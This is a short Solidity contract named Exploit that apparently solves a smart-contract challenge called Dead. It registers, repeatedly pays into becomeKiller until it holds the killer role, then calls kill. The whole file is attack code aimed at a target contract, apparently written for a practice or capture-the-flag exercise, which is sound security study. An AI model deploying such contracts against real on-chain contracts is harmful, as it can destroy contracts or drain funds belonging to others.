pragma solidity 0.7.4;

import "./Dead.sol";

contract Exploit {
    Dead challenge;

    constructor(address _challenge) payable {
        challenge = Dead(_challenge);
    }

    function finalize() public {
        challenge.register{value: 0.01 ether}();
        challenge.canKill();
        while (challenge.killer() != address(this)) {
            challenge.becomeKiller{value: 0.099 ether}();
        }
        challenge.kill();
    }

    fallback() external payable {}
}
